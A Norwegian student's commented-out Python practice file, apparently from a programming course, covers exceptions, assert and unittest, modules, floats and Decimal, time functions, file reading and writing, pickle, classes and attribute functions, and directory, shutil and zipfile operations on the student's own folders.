# entries = [2,3,4,5,6]
# try:
#     a = int(input("Enter a number:  "))
#     index = 0
#     while index < a:
#         print(entries[index])
#         index+=1
# except Exception as msg:
#     print("An error has occurred: ", msg)
# finally:
#     print("This code always executes.")


# a = 50
# assert type(a) is int, "Argumentet er ikke en integer"
# a = "50"
# assert type(a) is int, "Argumentet er ikke en integer"


# Test fra ChatGPT for å forstå assert bedre.

# import unittest                                                                 # Importerer unittest-biblioteket slik at vi kan skrive automatiske tester

# def gang_op(a, b):                                                              # Definerer en funksjon som skal returnere produktet av to verdier
#     assert type(a) is int, "Argument a er ikke en int"                          # Vi asserter (påstår) at a er en int. Hvis ikke, så stopper koden med en feilmelding
#     assert type(b) is int, "Argument b er ikke en int"                          # Samme sjekk som for b. Hvis dette feiler → AssertionError
#     return a * b                                                                # Hvis begge er int → returnes produktet/svaret (multiplikasjon)

# class TestGangOp(unittest.TestCase):                                            # Lager en testklasse som arver fra unittest.TestCase. Alt inni her er testmetoder.

#     def test_med_heletall(self):                                                # Første test: Vi tester vanlig bruk med to gyldige heltall
#         resultat = gang_op(5, 3)                                                # Kaller gang_op med verdiene 5 og 3
#         self.assertEqual(resultat, 15)                                          # Sjekker at resultatet faktisk er 15 (hvis ikke → test feiler)

#     def test_med_string(self):                                                  # Test nummer to: Vi tester hva som skjer hvis vi sender inn en string
#         with self.assertRaises(AssertionError) as context:                      # Vi forventer at koden kaster en AssertionError
#             gang_op("5", 3)                                                     # Vi prøver å sende inn en string som første argument → dette skal trigge assert'en

#         self.assertIn("Argument a er ikke en int", str(context.exception))      # Sjekker at riktig feilmelding ble gitt

#     def test_med_float(self):                                                   # Test nummer tre: Sjekker hva som skjer hvis vi sender inn et float
#         with self.assertRaises(AssertionError):                                 # Vi forventer at det kastes en AssertionError
#             gang_op(2.5, 4)                                                     # 2.5 er ikke en int → assert skal stoppe koden

# if __name__ == '__main__':                                                      # Dette betyr: hvis vi kjører filen direkte, ikke via import
#     unittest.main()                                                             # Kjør alle testene vi har definert


# min_variabel=42
# assert type(min_variabel) is str, "Variabelen er ikke av typen str"


# import cat

# cat.purr()
# cat.lick()
# cat.nap()

# cat.purr('Kitty')
# cat.lick('Kitty')
# cat.nap('Kitty')

# pet = input('Enter A Pet Name: ')

# cat.purr(pet)
# cat.lick(pet)
# cat.nap(pet)


# from myfunctions import *                                                   # Importerer funksjonene fra myfunctions.py

# navn = "Andreas"                                                            # Lager en streng med navnet som skal brukes
# print(velkommen(navn))                                                      # Kaller på velkommen-funksjonen og skriver ut resultatet

# tall = 7                                                                    # Lager en variabel med tallet som skal brukes
# print(f"Kvadratet av {tall} er {kvadrat(tall)}")                            # Kaller på kvadrat-funksjonen og skriver ut resultatet

# areal = kalk_areal_trekant(10, 5)                                           # Vi tildeler verdier som kan brukes til å beregne areal av en trekant
# print(f"Arealet av trekanten er {areal}")                                   # Utregning utføres og skrives til skjerm


# import sys

# print("Python version: ", sys.version)
# print("Python interpretor: ", sys.executable) # File path of the Python interpreter

# print("Folders where Python searches for modules:")
# for folder in sys.path:
#     print(folder)

# help()

# import keyword

# print("Python keywords:")
# for theword in keyword.kwlist:  # kwlist contains a list of Python keywords
#     print(theword)  #Hvis vi vil ha listen komma separert, legger vi til dette etter theword:, end=
# print()
# # iskeyword returns True or False depending on whether a word is a keyword
# print("Noroff is a Python keyword: ", keyword.iskeyword("Noroff"))


# import math

# avrunding = 2.3
# print("Taket for",avrunding,":\t\t\t",math.ceil(avrunding))                     # Husk \t er for å lage tab mellomrom. Det gir oss en pen utskrift på skjerm.
# print("Nederst for",avrunding,":\t\t",math.floor(avrunding))

# base = 2
# eksponent = 5
# print(base, "to the power of",eksponent,":\t\t",math.pow(base,eksponent))

# print("The square root of 64 is:\t", math.sqrt(64))

# import math

# print(math.factorial(10))

# import random

# print("Random nummer mellom 0 og 1:", random.random())
# print("Random nummer mellom 0 og 100:", random.random() * 100)

# print("Velg lotto nummer:")
# # Velger 6 ikke-gjentagende numbers mellom 1 to 50
# print("Dine lykketall er: ", random.sample(range(1, 51),6))

# value_one = 0.7
# value_two = 1.05
# first_result = value_one * value_two
# second_result = value_one + first_result

# print("Value one: ", "%.2f" % value_one)
# print("Value two: ", "%.2f" % value_two)
# print("First result (faktisk resultat er 0.735): ", "%.2f" % first_result)
# print("Second result (denne skulle blitt 1.435): ", "%.2f" % second_result)


# verdi_en = 0.7
# verdi_to = 1.05
# resultat_en = verdi_en * verdi_to
# resultat_to = verdi_en + resultat_en

# print("Verdi en: ", "%.20f" % verdi_en)

# # Viser oss numrene med 20 desimaler

# print("Value two: ", "%.20f" % verdi_to)
# print("First result: ", "%.20f" % resultat_en)
# print("Second result: ", "%.20f" % resultat_to)



# # Eksempel med bruk av Decimal for presise desimalberegninger

# verdi_en = Decimal("0.7")                               # Oppretter en desimalverdi, oppgitt som tekst for å unngå float-unøyaktighet
# verdi_to = Decimal("1.05")                              # Float som 1.05 kan ikke representeres nøyaktig binært
# resultat_en = verdi_en * verdi_to                       # Multipliserer verdiene nøyaktig
# resultat_to = verdi_en + resultat_en                    # Summerer den første verdien med resultatet av multiplikasjonen

# print("Value one: ", "%.2f" % verdi_en)                 # Viser første verdi med to desimaler
# print("Value two: ", "%.2f" % verdi_to)                 # Viser andre verdi med to desimaler
# print("First result: ", "%.2f" % resultat_en)           # Viser resultat av multiplikasjon
# print("Second result: ", "%.2f" % resultat_to)          # Viser totalsummen etter begge beregningene

# # Kommentar: Vanlig float (f.eks. 0.7) lagres som binære tall som ofte ikke er helt nøyaktige,
# # og kan derfor gi overraskende resultater ved sammenligning eller summering.
# # Decimal bruker eksakt representasjon og er nyttig i f.eks. økonomiske beregninger.


# from datetime import *

# nå = datetime.today()
# print("I dag: ",nå)
# print("Klokkeslett nå:  ", nå.hour, ":", nå.minute, sep="")
# print("I dag er en ", nå.strftime("%A"),sep="")
# print("Denne måneden er ", nå.strftime("%B"),sep="")



# from time import *

# start = time()
# start_tid = localtime(start)
# print("Startet: ", strftime("%X",start_tid))

# for i in range(0,10):
#     print(i + 1)
#     sleep(1) # Pauses for a second

# slutt = time()
# differanse = slutt - start
# print("Loop kjørte i", differanse, "sekunder.")

# import time  # Importerer time-modulen for tidtaking

# # Teksten brukeren skal skrive inn på nytt
# tekst = """Du må ikke tåle så inderlig vel, den urett som ikke rammer deg selv."""

# print("\nSkriv av følgende tekst (av Arnulf Øverland):\n")  # Introduksjon til brukeren
# print(tekst)  # Skriver ut teksten som skal gjengis

# input("\nTrykk Enter for å starte tidtakingen...")  # Venter på at bruker trykker Enter for å starte
# start_tid = time.time()  # Registrerer starttidspunktet

# # Brukeren skriver inn teksten de ser over
# input_tekst = input("\nSkriv inn teksten over og trykk Enter når du er ferdig:\n")

# slutt_tid = time.time()  # Registrerer sluttidspunktet når bruker trykker Enter igjen
# tid_brukt = slutt_tid - start_tid  # Kalkulerer totaltid i sekunder

# # Skriver ut tiden brukt, med to desimaler for presisjon
# print(f"\nDu brukte {tid_brukt:.2f} sekunder på å skrive teksten.")

# # Sammenligner brukerens input med originalen
# print("\nDin versjon:")
# print(input_tekst)
# print("\nOriginal tekst:")
# print(tekst)

# # Sjekker om teksten er nøyaktig riktig (case og linjeskift må matche)
# if input_tekst.strip() == tekst:
#     print("\nWow! Du skrev alt riktig! Bra jobba!")
# else:
#     if len(input_tekst.strip()) < len(tekst):
#         print("\nDu skrev ikke hele teksten... Du hadde én jobb. Én! Du får en sarkastisk... Good joooob...")
#     else:
#         print("\nDu kom i mål, men du har skrivefeil. Det hjelper ikke å være rask, hvis du ikke er nøyaktig! Prøv igjen... eller ikke... opp til deg.")


# Svar til tasks i 4.2

# Dette ligger også i mymodules.py. Tatt med her for å huske.

# import time                                 # For håndtering av tid
# import random                               # For generering av tilfeldige tall

# def create_time():
#     return time.time()                      # Returnerer nåværende tidspunkt (epoch time)

# def output_local_time(time_obj):
#     lokal_tid = time.ctime(time_obj)        # Konverterer epoch time til lokal tid som streng
#     print(f"Lokal tid: {lokal_tid}")

# def calculate_difference(start, end):
#     return end - start                      # Returnerer forskjellen i sekunder mellom to tidspunkt

# def generate_random(max_tall):
#     return random.randint(0, max_tall)      # Returnerer et tilfeldig heltall mellom 0 og max_tall (inkludert)


# Dette finner vi også i guessinggame.py. Tatt med her for å huske.

# from mymodules import create_time, output_local_time, calculate_difference, generate_random

# print("Velkommen til Gjett Tallet-spillet!")
# print("Jeg \"tenker\" på et tall mellom 0 og 10. Kan du gjette hva det er?")

# spill_aktivt = True                                                                                                     # Brukes for å kontrollere om spillet skal fortsette
# start_tid = create_time()                                                                                               # Registrerer starttidspunktet for spillet

# total_runder = 0                                                                                                        # Teller antall runder som er spilt

# while spill_aktivt:
#     riktig_tall = generate_random(10)                                                                                   # Genererer et tilfeldig tall mellom 0 og 10
#     try:
#         bruker_input = input("\nGjett et tall mellom 0 og 10: ")                                                        # Leser brukerens rå input først
#         gjetning = int(bruker_input)                                                                                    # Prøver å konvertere input til heltall
#         total_runder += 1

#         if gjetning == riktig_tall:
#             print("Wow! Det der vaaar så flaks det!")
#         else:
#             print(f"Nope! Jeg tenkte på {riktig_tall}. Hihi!")

#         fortsette = input("Vil du feile igjen? (ja/nei): ").lower()
#         if fortsette != "ja":
#             spill_aktivt = False

#     except ValueError:
#         print(f"Ser '{bruker_input}' ut som et tall for deg? Du hadde én jobb... én!!.")

# slutt_tid = create_time()                                                                                               # Når spillet er slutt, registrer sluttidspunktet
# varighet = calculate_difference(start_tid, slutt_tid)                                                                   # Kalkuler hvor lenge spillet varte

# print(f"\nDu kastet nå bort {int(varighet)} sekunder og prøvde {total_runder} gang(er)."
#       "Takk for spillet, men vi vet begge to at du hadde bedre ting å gjøre!")
# output_local_time(slutt_tid)                                                                                            # Viser når spillet ble avsluttet



# print("Opening testfile.txt")                        # Opens "thefile.txt" in writable mode
#                                                     # If the file doesn't exist, it is created
# my_file = open("testfile.txt","w")
# print()
# print("File methods and properties:")               
# print("name: ", my_file.name)                       # The name property provides the file system name of the associated file
# print("mode: ", my_file.mode)                       # The mode property provides details on which mode the file was opened as
# print("closed: ", my_file.closed)                   # The closed property returns true if the file is closed
# print("readable(): ", my_file.readable())           # The readable() method returns true if the file is readable
# print("writable(): ", my_file.writable())           # The writable() method returns true if the file is writable
# print()
# print("Opening testfile.txt")                       # Opens "testfile.txt" in readable mode

# my_file.close()                                     # Closes the file to release the resources
# print()
# print("File methods and properties:")
# print("closed: ", my_file.closed)


# min_fil = open("testfile.txt","w")

# # The following string will be written to file
# # as 3 separate lines.
# skriv_inn = '''Disse linjene skrives
# til fil slik
# at vi kan se.\n'''                           # Vi bruker \n (escape character) for å signalisere at det som kommer skal på ny linje. Merk: Kun den siste linjen har synlin \n, de andre bruker faktiske linjeskift.
# min_fil.write(skriv_inn)

# min_fil.write("Extra line 1\n")         # Linjer kan også skrives inn en om gangen, ved å kalle write() for hver linje som skal skrives.
# min_fil.write("Extra line 2\n")         #Merk at vi bruker \n for å signalisere at det som kommer skal på ny linje.
# min_fil.write("Extra line 3\n")

# min_fil.close()                         # Husk!!!! Vi lukker alltid filen(e) når vi er ferdig med å skrive til den/dem. Dette for å frigjøre ressurser, men også for at systemet ikke skal holde filen "åpen". 



# my_file = open("thecsvfile.csv","w")

# # First row / heading
# my_file.write("Name;Description;Amount\n")
# # Other rows
# my_file.write("John Doe; First customer; 1000.00\n")
# my_file.write("Jane Doe; Second customer; 2500.00\n")

# my_file.close()




# min_fil = open("testfile.txt","r")  # Åpner filen "thefile.txt" i lesbar modus

# print(min_fil.read())               # Viser alt innholdet i filen.

# min_fil.seek(0)                     # Flytt filpekeren tilbake til start, slik at vi kan lese filen på nytt.

# for line in min_fil:                # Viser alt innholdet i filen, linje for linje, ved å bruke en for-løkke.
#     print(line, end="")             # Vi bruker end="" for å unngå at det legges til et ekstra linjeskift etter hver linje som leses fra filen. Dette fordi linjene allerede har et linjeskift på slutten.
    
# min_fil.close()                     # Husk å lukke filen når vi er ferdig med å lese den. Dette frigjør ressurser og gjør at andre programmer kan bruke filen igjen.



# The file is opened using the readable mode
# testfile = open("testfile.txt","a")

# for i in range(0,4):
#     # The write statement appends an extra line to the file.
#     testfile.write("Enda en linje {}\n".format(i + 1))

# testfile.close()



# Task: 4.3 - Skript for å lese og skrive til en tekstfil

# Dette skriptet leser innholdet i en tekstfil og viser det til brukeren, før det lar brukeren legge til nye verdier i samme fil.

# filnavn = "verdier.txt"                                                                                 # Navnet på filen vi jobber med

# # 1. Vi åpner filen i lesemodus og skriver innhold til skjerm:
# try:
#     with open(filnavn, "r", encoding="utf-8") as fil:
#         innhold = fil.read()                                                                            # Vi leseru ut alt fra filen
#         print("\nInnhold i filen")
#         print(innhold if innhold.strip() else "(Filen er tom)")                                         # Viser innholdet, eller beskjed hvis filen er tom
# except FileNotFoundError:
#     print(f"\nFilen '{filnavn}' finnes ikke ennå. Den vil bli opprettet når du legger til verdier.")

# # 2. Starter en loop som lar brukere legge til verdier
# print("\nSkriv inn noe du ønsker å lagre i filen. Skriv 'stopp' for å avslutte.")

# while True:
#     bruker_input = input("> ")                                                                          # Ber bruker skrive inn noe
#     if bruker_input.lower() == "stopp":
#         break                                                                                           # Avslutter løkken (break) hvis brukeren skriver 'stopp'
#     try:
#         with open(filnavn, "a", encoding="utf-8") as fil:
#             fil.write(bruker_input + "\n")                                                              # Legger til verdien i filen med linjeskift
#     except Exception as e:
#         print(f"Hehe... det gikk ikke etter planen, klarte ikke skrive til fil: {e}")

# print("\nTankene dine er lagret. Kjør skriptet på nytt for å se hvordan filen vokser!")




# with open("min_fil.txt","r+") as min_fil:       # Vi åpner filen i lesbar og skrivbar modus (r+). Ved å kjøre koden i en with-blokk, vil filen bli lukket når blokken er ferdig.
#     min_fil.seek(50)                            # Flytter filpekeren til posisjon 50 i filen. Dette er nyttig hvis vi ønsker å skrive over noe som allerede finnes i filen.
#     min_fil.write("#####")                      # Skriver "#####" på posisjon 50 i filen. Dette vil overskrive det som allerede er der.
#     min_fil.seek(0)                             # Flytter filpekeren tilbake til starten av filen, slik at vi kan lese hele filen fra begynnelsen.
#     print(min_fil.read())                       # Leser hele filen og skriver den ut til skjermen. Dette viser oss innholdet i filen etter at vi har skrevet over posisjon 50 med "#####".
#     min_fil.close()                             # Lukker filen. Dette er viktig for å frigjøre ressurser og sikre at endringene blir lagret korrekt.


# import os

# temp_file = open("tempfile.txt","x")        # Åpner en fil i "exclusive creation" modus (x). Hvis filen allerede finnes, vil det kastes en FileExistsError.
# temp_file.close()                           # Lukker filen igjen etter opprettelse.

# if os.path.isfile("tempfile.txt"):          # Sjekker om filen "tempfile.txt" finnes i det gjeldende arbeidsområdet.
#     print("Fil funnet - nuking it now.")    # Hvis filen finnes fra før, skriver vi en bekreftelse til skjermen.
#     os.remove("tempfile.txt")               # Fjerner filen "tempfile.txt" fra det gjeldende arbeidsområdet.


# import pickle, os

# for runs in range(0,3):                             # Kjører koden tre ganger. I den første runden vil ikke pickle eksistere. Den vil bli opprettet på slutten av den første runden. Deretter legger vi bare til.
#     print("Loop {}".format(runs+1))                 # Skriver ut hvilken runde vi er på
#     data = [0, 1, 2, 3]                             # Lager en liste med fire verdier som skal brukes i eksempelet.
#     if os.path.isfile("mypickle.dat"):              # Sjekker om filen "mypickle.dat" finnes i det gjeldende arbeidsområdet.
#         print("Loading pickle")                     # Hvis filen finnes, skriver vi en bekreftelse til skjermen om at vi laster inn pickle.
#         lagret_pickle = open("mypickle.dat","rb")   # Åpner filen "mypickle.dat" i lesbar og binærmodus (rb). Dette er viktig for å lese data som er lagret i pickle-format.
#         data = pickle.load(lagret_pickle)           # Vi bruker pickle.load() for å lese data fra filen. Dette vil laste inn dataene som en liste, siden vi antok at de ble lagret som en liste tidligere.
#         lagret_pickle.close()                       # Lukker filen etter at vi har lest dataene. Dette er viktig for å frigjøre ressurser og sikre at endringene blir lagret korrekt.
#     else:
#         print("No pickle to load")                  # Hvis filen ikke finnes, skriver vi en beskjed om at det ikke er noen pickle å laste inn.
#     print("Data before modification:")              # Skriver ut en overskrift for dataene før de blir endret.
#     print(data)

#     for i in range(0,4):                            # Går gjennom hver verdi i listen data.
#         data[i] = data[i] + 1                       # Øker hver verdi i listen med 1. Dette er et enkelt eksempel på hvordan vi kan endre dataene i listen.
    
#     print("Data after modification:")               # Skriver ut en overskrift for dataene etter de er endret.
#     print(data)
    
#     print("Pickling the data")                      # Skriver ut en beskjed om at vi lagrer dataene i pickle-format.
#     ny_pickle = open("mypickle.dat","wb")           # Åpner filen "mypickle.dat" i skrivbar og binærmodus (wb). Dette er viktig for å lagre data i pickle-format.
#     pickle.dump(data,ny_pickle)                     # Bruker pickle.dump() for å lagre dataene i filen. Dette vil lagre listen data i pickle-format, slik at den kan leses inn igjen senere.
#     ny_pickle.close()                               # Lukker filen etter at vi har lagret dataene. Dette er viktig for å frigjøre ressurser og sikre at endringene blir lagret korrekt.
#     print("-" * 30)                                 # Skriver ut en linje med 30 bindestreker for å skille mellom rundene i utskriften.






# from plussen import *                           # Importerer Ansatt-klassen fra plussen.py

# ansatt_1 = Ansatt()                             # Lager ett Ansatt-objekt
# Ansatt.telling += 1                             # Inkrementerer telling med 1

# ansatt_2 = Ansatt()                             # Legger til en ny Ansatt-klasse
# Ansatt.telling += 1                             # Inkrementerer telling med 1

# print("Antall ansatte: {}".format(Ansatt.telling))      # Demonstrerer at verdien AV "count" deles blant "Student" instansene.




# Denne ligger også i egen fil, betjentene.py. Tatt med her for å huske.
# # Dette er klassen vår som representerer en politibetjent.
# # Den holder styr på navn, alder og hvor mange forbrytelser betjenten har stoppet.
# class Politibetjent:
#     def __init__(self, fornavn, etternavn, alder):
#         self.fornavn = fornavn                          # Navnet på helten
#         self.etternavn = etternavn                      # Etternavnet på helten
#         self.alder = alder                              # Hvor lenge helten har vært på jorda
#         self.stoppet_forbrytelser = 0                   # Starter på 0. Gjelder ikke minor crimes, men ekte skurker!

#     def stopp_forbrytelse(self):
#         self.stoppet_forbrytelser += 1                  # Øker antall forbrytelser stoppet med 1. Kapow!

#     def fullt_navn(self):
#         return f"{self.fornavn} {self.etternavn}"       # For de gangene vi trenger å rope navnet dramatisk i radioen

#     def rapport(self):
#         print(f"{self.fullt_navn()} (Alder: {self.alder}) har stoppet {self.stoppet_forbrytelser} forbrytelser.")  # All creds fortjent


# from betjentene import *         # Importerer Politibetjent-klassen fra betjentene.py. Dette er superhelten vår, som redder dagen ved å stoppe forbrytelser.


# Hoveddelen av programmet. Her skjer magien. Eller i det minste... loggingen.

# from betjentene import Politibetjent  # Importerer helten(e) våre fra modulen

# # Lager to politibetjenter
# betjent_1 = Politibetjent("Sandra", "Skum", 34)
# betjent_2 = Politibetjent("Roger", "Røff", 45)

# # De gjør jobben sin – stopper forbrytelser!
# betjent_1.stopp_forbrytelse()
# betjent_1.stopp_forbrytelse()  # Sandra er on fire

# betjent_2.stopp_forbrytelse()  # Roger er rett på sak

# # Tid for rapport
# betjent_1.rapport()
# betjent_2.rapport()


# # Dette ligger i egen modul, og importeres. Tatt med her for å huske.

# # ansatt_module.py

# # class Ansatt:                           # En Klasse variabel for å holde styr på det totale antall ansatte
# #     telling = 0                         # Telling av ansatte, starter på 0

# #     def __init__(self):
# #         self.navn = ""                   # Instans variabel for fornavn
# #         self.etternavn = ""                # Instans variabel for etternavn
# #         Ansatt.telling += 1              # Øk teller i hele Klassen
# #         self.nummer = Ansatt.telling     # Tildel dette som ansattnummer

# from ansatt_module import Ansatt  # Importerer Klassen Ansatt fra ansatt_module.py

# # Lager to Ansatt-objekter
# ansatt_1 = Ansatt()
# ansatt_1.navn = "Andreas"
# ansatt_1.etternavn = "Andresen"

# ansatt_2 = Ansatt()
# ansatt_2.navn = "Vicky"
# ansatt_2.etternavn = "Andresen"

# # Output the results
# print("{}: {} {}".format(ansatt_1.nummer, ansatt_1.navn, ansatt_1.etternavn))
# print("{}: {} {}".format(ansatt_2.nummer, ansatt_2.navn, ansatt_2.etternavn))
# print("Antall ansatte: {}".format(Ansatt.telling))



# # Dette ligger i egen modul, ansatt_module_2.py, og importeres. Tatt med her for å huske.

# # ansatt_module_2.py

# class Ansatt:
#     telling = 0  # Klassevariabel for å holde styr på antall ansatte totalt

#     def __init__(self, navn, etternavn):
#         self.navn = navn                      # Instansvariabel for fornavn
#         self.etternavn = etternavn            # Instansvariabel for etternavn
#         Ansatt.telling += 1                  # Øker teller ved hver ny ansatt
#         self.nummer = Ansatt.telling         # Hver ansatt får sitt eget nummer
#         self.prosjekter = {}                  # Tom ordbok for prosjekter og vurdering

#     def vis_info(self):
#         print(f"{self.nummer}:\t{self.navn} {self.etternavn}\n")

#         if len(self.prosjekter) == 0:
#             print("\tIngen prosjekter eller vurderinger er lagt til")
#         else:
#             for prosjekt in self.prosjekter:
#                 print(f"\t{prosjekt}:\t\t{self.prosjekter[prosjekt]}")

#             # Bruker self til å kalle på beregn_snitt-metoden
#             print(f"\tGjennomsnitt:\t{self.beregn_snitt()}")

#         print("-" * 50)

#     def legg_til_prosjekt(self, prosjekt, vurdering):
#         self.prosjekter[prosjekt] = vurdering  # Legger til prosjekt og vurdering i ordboka

#     def beregn_snitt(self):
#         total = 0
#         for prosjekt in self.prosjekter:
#             total += self.prosjekter[prosjekt]  # Summerer alle vurderingene

#         return total / len(self.prosjekter)     # Returnerer gjennomsnittet


# # Hoveddelen av programmet. Her skjer magien. Eller i det minste... loggingen.
# from ansatt_module_2 import Ansatt  # Importerer Student-klassen fra student_module.py

# # Lager to Student-objekter med navn og etternavn
# ansatt_1 = Ansatt("Andreas", "Andresen")
# ansatt_2 = Ansatt("Vicky", "Andresen")

# # Legger til prosjekter og vurdering for student_1
# ansatt_1.legg_til_prosjekt("LLB", 80)
# ansatt_1.legg_til_prosjekt("ABB", 85)

# # Legger til prosjekter og vurdering for student_2
# ansatt_2.legg_til_prosjekt("SBA", 75)
# ansatt_2.legg_til_prosjekt("BRO", 90)

# # Viser resultatene for begge studentene
# ansatt_1.vis_info()
# ansatt_2.vis_info()

# # Viser totalt antall studenter opprettet
# print(f"Antall ansatte: {Ansatt.telling}")


# class Employee:
#     def __init__(self, name):
#         self.name = name

# first = Employee("Freya")
# second = Employee("Klaus")
# del second.name

# print(first.name)
# print(second.name)


# class Employee:
#     def __init__(self, name):
#         self.name = name

# first = Employee("Frey")
# second = Employee("Klaus")


# # Set the attribute "name" of first to "Freya"
# setattr(first,"name","Freya")
# # Get the attribute "name" of first
# print(getattr(first,"name"))
# print("-" * 35)

# # Delete the attribute "name" of second
# delattr(second,"name")

# # Test if second has the attribute "name"
# if hasattr(second,"name"):
#     print(getattr(second,"name"))
# else:
#     print("second does not have attribute name")


# class Employee:
#     def __init__(self, name):
#         self.name = name

# first = Employee("Frey")

# for attribute in dir(first):
#     print(attribute)


# from politibetjent import Politibetjent  # Importerer helten vår

# # Lager to politibetjenter
# betjent_1 = Politibetjent("Andreas", "Andresen", 45, 12)
# betjent_2 = Politibetjent("Sandra", "Solstad", 38, 7)

# # Setter en ny verdi med setattr
# setattr(betjent_1, "alder", 46)  # Andreas hadde bursdag!
# setattr(betjent_2, "fornavn", "Sandra-Marie")  # Navneendring

# # Henter verdier med getattr
# print(f"{getattr(betjent_1, 'fornavn')} er nå {getattr(betjent_1, 'alder')} år gammel.")
# print(f"{getattr(betjent_2, 'fornavn')} har stoppet {getattr(betjent_2, 'antall_forbrytelser')} forbrytelser.")

# # Demonstrerer bruk av del (sletter et attributt)
# del betjent_1.antall_forbrytelser  # Fjerner statistikken (ikke anbefalt, men lovlig i Python)

# # Prøver å hente det slettede attributtet (vil gi feilmelding hvis vi ikke er forsiktige)
# try:
#     print(f"Andreas har stoppet {betjent_1.antall_forbrytelser} forbrytelser.")
# except AttributeError:
#     print("Oops! Andreas' statistikk er slettet – det finnes ingen data lenger.")

# # Legger til ny utmerkelse og viser info
# betjent_2.legg_til_utmerkelse("Gullstjerne for innsats mot datasvindel")
# betjent_2.vis_info()


# root_path = "c:\Skole ting\Programming\Python scripts"
# print(root_path)

# # Dette er fremgangsmåten som bør benyttes
# import os

# root_path = os.path.join("c:","Skole ting","Programming", "Python scripts")  # Bruker os.path.join for å lage en plattformuavhengig sti
# print(root_path)

# os.getcwd()
# print("Gjeldende arbeidsmappe:", os.getcwd())  # Viser gjeldende arbeidsmappe




# import os

# root_path = os.path.join("C:\\", "Skole ting", "Programming", "Python scripts")

# for current, subdirectories, files in os.walk(root_path):
#     # Displays the name of the current directory
#     print("Current directory:",current)
    
#     # Displays the names of the folders in the current directory
#     for current_subdir in subdirectories:
#         print("Subdirectory:", current_subdir)
        
#     # Displays the names of all the files in the current directory 
#     for current_file in files:       
#         print("File:", current_file)
        
#     print()


# import os

# # Funksjon som går gjennom hele katalogstrukturen og skriver ut innholdet
# def Innhold(nåværende_sti):
#     print(nåværende_sti)
    
#     # Går gjennom alle undermapper og filer i den angitte katalogen
#     for nåværende, undermapper, filer in os.walk(nåværende_sti):
#         # Sorterer undermappene og filene alfabetisk (etter navn)
#         undermapper.sort()
#         filer.sort()

#         # Går gjennom hver undermappe og kaller funksjonen rekursivt
#         for undermappe in undermapper:
#             # Setter sammen full sti til undermappen
#             neste_sti = os.path.join(nåværende_sti, undermappe)
            
#             # Sjekker at stien faktisk finnes før den brukes videre
#             if os.path.exists(neste_sti):
#                 Innhold(neste_sti)

#         # Går gjennom alle filene i nåværende katalog
#         for filnavn in filer:
#             # Setter sammen full sti til filen
#             full_fil_sti = os.path.join(nåværende_sti, filnavn)
            
#             # Sjekker at filstien er gyldig før den vises
#             if os.path.exists(full_fil_sti):
#                 print(full_fil_sti)

# # Startsti – her kan du endre til ønsket katalog
# start_sti = os.path.join("C:\\", "Skole ting", "Programming", "Python scripts")
# Innhold(start_sti)


# import os

# entries = os.listdir(r"\Skole ting\Programming\Python scripts")
# for entry in entries:
#     print(entry)



# import os

# entries = os.scandir(r"\Skole ting\Programming\Python scripts")  # Bruker scandir for å få en iterator over filsystemoppføringer
# for entry in entries:
#     print(entry)


# from pathlib import Path

# entries = Path(r"\Skole ting\Programming\Python scripts")  # Oppretter et Path-objekt for katalogen
# for entry in entries.iterdir():
#     print(entry)


# import os

# root_path = "c:\\Skole ting\\Programming\\Python scripts"
# os.mkdir(("c:\\Skole ting\\Programming\\Python scripts\\testdir"))  # Lager en ny tom katalog, testdir.
# Innhold(root_path) # Vi bruker metoden Innhold(), som vi lagde litt høyere opp i denne filen for å se at den nye mappen ligger der.


# import os

# root_path = "c:\\Skole ting\\Programming\\Python scripts\\testdir"
# # Creates the new directory 
# os.mkdir("c:\\Skole ting\\Programming\\Python scripts\\testdir\\test2\\test3")



# import os

# root_path = os.path.join ("C:\\", "Skole ting", "Programming", "Python scripts")    # Min filsti
# os.makedirs(r"c:\Skole ting\Programming\Python scripts\testdir\test2\test3")   # Lager en ny katalog med flere undermapper. Dette vil lage alle mappene i stien hvis de ikke allerede finnes.
# Innhold(root_path)  # Vi bruker metoden Innhold(), som vi lagde litt høyere opp i denne filen for å se at den nye mappen ligger der.

# import os
# os.rmdir(r"c:\Skole ting\Programming\Python scripts\testdir")

# import shutil
# shutil.rmtree(r"c:\Skole ting\Programming\Python scripts\testdir")  # Sletter katalogen og alt innholdet i den. Dette er en kraftig operasjon, så vær forsiktig!


# import shutil

# shutil.move(r"c:\Skole ting\Programming\Python scripts\testtxt.txt", r"c:\Skole ting\Programming\Python scripts\old\testtxt.txt")  # Flytter filen testxt.txt til en mappe kalt old. Hvis mappen ikke finnes, vil den kaste en feil.

# import shutil

# shutil.copy(r"c:\Skole ting\Programming\Python scripts\testtxt.txt", r"c:\Skole ting\Programming\Python scripts\old\testtxt.txt") # Kopierer filen testxt.txt til en mappe kalt old. Hvis mappen ikke finnes, vil den kaste en feil.


# import os

# os.rename(r"c:\Skole ting\Programming\Python scripts\testtxt.txt", r"c:\Skole ting\Programming\Python scripts\txttest.txt")  # Endrer navnet på filen testxt.txt til txttest.txt. Hvis filen ikke finnes, kastes en feil.


# import os
# os.remove(r"c:\Skole ting\Programming\Python scripts\testtxt.txt")  # Sletter filen testxt.txt. Hvis filen ikke finnes, kastes en feil.


# import os
# from datetime import datetime

# resultat = os.stat(r"c:\Skole ting\Programming\Python scripts\old\Video\Jan 25 FT - PRG Intro & Module 1 Review-20250425_120124-Meeting Recording.mp4")  # Henter filstatistikk for den angitte filen
# print(resultat)
# print()
# print("Size: {} bytes".format(resultat.st_size))
# print("Created: {}".format(datetime.fromtimestamp(resultat.st_ctime)))
# print("Accessed: {}".format(datetime.fromtimestamp(resultat.st_atime)))
# print("Modified: {}".format(datetime.fromtimestamp(resultat.st_mtime)))


# import zipfile

# with zipfile.ZipFile('Test.zip', 'r') as zipfile:
#     for current in zipfile.namelist():
#         print(current)


# import zipfile

# with zipfile.ZipFile(r'c:/Skole ting/Programming/Python scripts/Test.zip', 'r') as zipfile:
#     file_info = zipfile.getinfo("AW-17 Programming.pdf")
#     print("File size: {} bytes".format(file_info.file_size))
#     print("Compressed size: {} bytes".format(file_info.compress_size))
#     print("Last modified: {}".format(file_info.date_time))


# import zipfile

# with zipfile.ZipFile('Test.zip', 'r') as zipfile:
    
#     zipfile.extract("AW-17 Programming.pdf") # Pakker kun ut den spesifikke filen nåværende arbeidskatalog
#     zipfile.extractall(path="c://Skole ting//Programming//Python scripts") # Pakker ut alle filer i den angitte mappen


# import zipfile

# with zipfile.ZipFile('Test2.zip', 'w') as arkiv: # Vi lager en ny zip-fil i gjeldende arbeidskatalog. Dersom den eksisterer allerede, vil den bli overskrevet.
#     arkiv.write("Test1.txt") # Disse filene ligger i gjeldende arbeidskatalog, men vi kan spesifisere andre fil-stier hvis vi vil.
